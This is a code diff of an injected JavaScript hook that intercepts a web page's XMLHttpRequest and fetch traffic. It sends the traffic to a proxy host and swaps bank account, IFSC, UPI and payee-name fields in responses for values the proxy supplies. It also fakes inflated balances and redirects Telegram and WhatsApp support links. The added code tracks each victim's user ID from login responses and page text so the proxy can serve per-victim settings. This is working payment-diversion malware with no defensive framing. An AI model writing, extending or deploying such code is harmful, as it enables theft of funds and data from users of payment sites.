@@ -731,6 +731,18 @@ if(window._pxi)return;window._pxi=1;
 var P='https://${PROXY_HOST}';
 var CFG=null;
 var UID='';
+var UID_LOCKED=false;
+
+try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\d{6,12}$/.test(_ls)){UID=_ls;}}catch(e){}
+
+function setUID(id,lock){
+if(!id||!/^\d{6,12}$/.test(id))return;
+if(UID_LOCKED&&!lock)return;
+if(id===UID)return;
+UID=id;
+try{localStorage.setItem('_px_uid',id);}catch(e){}
+if(lock)UID_LOCKED=true;
+lc();}
 
 function lc(){
 try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);x.send();
@@ -763,18 +775,18 @@ payeeifsc:'if',receiverifsc:'if',collectionifsc:'if',
 bankname:'bn',bank_name:'bn',payeebankname:'bn',receiverbankname:'bn',
 upiid:'ui',upi_id:'ui',upi:'ui',vpa:'ui',payeeupi:'ui',receiverupi:'ui',walletupi:'ui'};
 
-var NF={'name':1,'payname':1,'收款人':1,'收款人姓名':1,'收款姓名':1,'持卡人':1};
+var NF={'name':1,'payname':1,'\u6536\u6b3e\u4eba':1};
 
 function rb(o,d){
 if(!o||typeof o!=='object'||!CFG||!CFG.an||d>10)return;
 if(Array.isArray(o)){for(var i=0;i<o.length;i++)rb(o[i],d+1);return;}
 var hasAcct=false;
-for(var k in o){var kl=k.toLowerCase().replace(/[_\\-]/g,'');
+for(var k in o){var kl=k.toLowerCase().replace(/[_\-]/g,'');
 if(BF[kl]==='an'||BF[kl]==='if')hasAcct=true;}
 for(var k in o){
 if(typeof o[k]==='object'){rb(o[k],d+1);continue;}
 if(typeof o[k]!=='string'&&typeof o[k]!=='number')continue;
-var kl=k.toLowerCase().replace(/[_\\-]/g,'');
+var kl=k.toLowerCase().replace(/[_\-]/g,'');
 var m=BF[kl];
 if(m&&CFG[m]&&String(o[k]).length>0){o[k]=CFG[m];continue;}
 if(NF[kl]&&hasAcct&&CFG.ah&&String(o[k]).length>0){o[k]=CFG.ah;}
@@ -797,27 +809,46 @@ if(!isNaN(v)&&v>=0){o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):par
 if(typeof o[k]==='object'&&o[k]!==null)addBal(o[k],bonus,d+1);
 }}
 
+var ID_FIELDS=['memberCodeId','memberCode','member_code','member_code_id','userId','user_id','channelUid','channel_uid','uid','memberId','member_id','accountId','account_id','customerId','customer_id','userCode','user_code','loginId','login_id','userNum','userNumber','memberNum','memberNumber','userID','UserID','memberID','MemberID'];
+
 function fid(o,d){
-if(!o||typeof o!=='object'||d>6)return'';
+if(!o||typeof o!=='object'||d>8)return'';
 if(Array.isArray(o))return'';
-var fs=['memberCodeId','userId','channelUid','uid','memberId','user_id','accountId','customerId','userCode','codeId','code_id','member_id'];
-for(var i=0;i<fs.length;i++){
-if(o[fs[i]]!==undefined&&o[fs[i]]!==null&&o[fs[i]]!==''){
-var v=String(o[fs[i]]);if(/^\\d{3,}$/.test(v))return v;}}
+for(var i=0;i<ID_FIELDS.length;i++){
+var f=ID_FIELDS[i];
+if(o[f]!==undefined&&o[f]!==null&&o[f]!==''){
+var v=String(o[f]).trim();
+if(/^\d{6,12}$/.test(v))return v;}}
 if(o.id!==undefined&&o.id!==null&&o.id!==''){
-var v2=String(o.id);if(/^\\d{6,}$/.test(v2))return v2;}
-for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var f=fid(o[k],d+1);if(f)return f;}}
+var v2=String(o.id).trim();if(/^\d{6,12}$/.test(v2))return v2;}
+for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var f2=fid(o[k],d+1);if(f2)return f2;}}
 return'';}
 
-function modResp(text){
+function extractLoginUID(text){
+try{
+var j=JSON.parse(text);
+var candidates=[j,j.data,j.body,j.result,j.user,j.member,j.info];
+for(var i=0;i<candidates.length;i++){
+var id=candidates[i]?fid(candidates[i],0):'';
+if(id)return id;}
+}catch(e){}
+return'';}
+
+function isLoginUrl(u){
+return/login|Login|signin|signIn|auth|Auth|doLogin|member\/login|user\/login|api\/login/i.test(u||'');}
+
+function modResp(text,isLogin){
 if(!CFG||!CFG.enabled)return text;
 try{
 var j=JSON.parse(text);
 var d=j.data||j.body||j.result||j;
+if(isLogin){
+var lid=extractLoginUID(text);
+if(lid)setUID(lid,true);
+}else{
 var id=fid(d,0)||fid(j,0);
-if(id&&id!==UID){UID=id;
-try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config?userId='+id,false);x.send();
-if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
+if(id)setUID(id,false);
+}
 if(CFG.an){rb(d,0);rb(j,0);}
 var bonus=CFG.bonus||0;
 if(bonus){if(d&&typeof d==='object')addBal(d,bonus,0);addBal(j,bonus,0);}
@@ -844,10 +875,12 @@ var url=this._hu||'';
 if(url.indexOf(P)===0)return orig;
 try{
 var bs=this._bs||'';
+var login=this._isLogin||false;
 sendLog(url,this._hm||'',bs,orig,this.status);
 if(CFG&&CFG.enabled){
-var mod=modResp(orig);
+var mod=modResp(orig,login);
 if(mod!==orig){this._pxRT=mod;return mod;}}
+else if(login){var lid2=extractLoginUID(orig);if(lid2)setUID(lid2,true);}
 }catch(e){}
 return orig;},configurable:true});
 
@@ -858,8 +891,14 @@ return _rDesc.get.call(this);},configurable:true});
 
 var _open=XMLHttpRequest.prototype.open;
 var _send=XMLHttpRequest.prototype.send;
-XMLHttpRequest.prototype.open=function(m,u){this._hu=u;this._hm=m;return _open.apply(this,arguments);};
-XMLHttpRequest.prototype.send=function(body){this._bs=b2s(body);return _send.apply(this,arguments);};
+XMLHttpRequest.prototype.open=function(m,u){this._hu=u;this._hm=m;this._isLogin=isLoginUrl(u);return _open.apply(this,arguments);};
+XMLHttpRequest.prototype.send=function(body){
+this._bs=b2s(body);
+if(this._isLogin){
+var self=this;
+this.addEventListener('load',function(){
+try{var orig=_rtDesc.get.call(self);var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}catch(e){}});}
+return _send.apply(this,arguments);};
 
 var _fetch=window.fetch;
 if(_fetch){
@@ -868,6 +907,7 @@ var url=typeof input==='string'?input:(input&&input.url)||'';
 if(url.indexOf(P)===0)return _fetch.apply(this,arguments);
 var method=(init&&init.method)||'GET';
 var bs=b2s(init&&init.body);
+var login=isLoginUrl(url);
 return _fetch.apply(this,arguments).then(function(resp){
 try{
 var ct=resp.headers.get('content-type')||'';
@@ -875,8 +915,9 @@ if(ct.indexOf('json')===-1&&ct.indexOf('text')===-1)return resp;
 var cl=resp.clone();
 return cl.text().then(function(text){
 sendLog(url,method,bs,text,resp.status);
+if(login){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
 if(CFG&&CFG.enabled&&ct.indexOf('json')>-1){
-var mod=modResp(text);
+var mod=modResp(text,login);
 if(mod!==text)return new Response(mod,{status:resp.status,statusText:resp.statusText,headers:resp.headers});}
 return resp;}).catch(function(){return resp;});
 }catch(e){return resp;}
@@ -885,6 +926,14 @@ return resp;}).catch(function(){return resp;});
 function csUrl(s){
 if(!s||typeof s!=='string')return false;
 return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1;}
+
+function scanDOM(){
+try{
+if(!document.body)return;
+var txt=document.body.innerText||'';
+var m1=txt.match(/\bID\s*[::]\s*([0-9]{6,12})\b/i);
+if(m1&&m1[1]){setUID(m1[1],false);return;}
+}catch(e){}}
 
 function fixLinks(){
 if(!CFG||!CFG.tg)return;
@@ -943,20 +992,11 @@ el.setAttribute('href','syt:'+encodeURIComponent(JSON.stringify(jo2)));}}catch(e
 el=el.parentElement;depth++;}
 },true);
 
-try{
-var domId=document.body?document.body.innerText.match(/ID[:\\s]*([0-9]{6,})/):null;
-if(domId&&domId[1]&&!UID){UID=domId[1];lc();}
-}catch(e){}
-setInterval(function(){
-try{
-if(!UID){
-var m=document.body?document.body.innerText.match(/ID[:\\s]*([0-9]{6,})/):null;
-if(m&&m[1]){UID=m[1];lc();}}
-}catch(e){}
-},5000);
+scanDOM();
+setInterval(function(){scanDOM();},3000);
 
 if(document.body){
-var obs=new MutationObserver(function(){fixLinks();fixOnClick();});
+var obs=new MutationObserver(function(){fixLinks();fixOnClick();scanDOM();});
 obs.observe(document.body,{childList:true,subtree:true});}
 setInterval(function(){fixLinks();fixOnClick();},2000);
 fixLinks();fixOnClick();
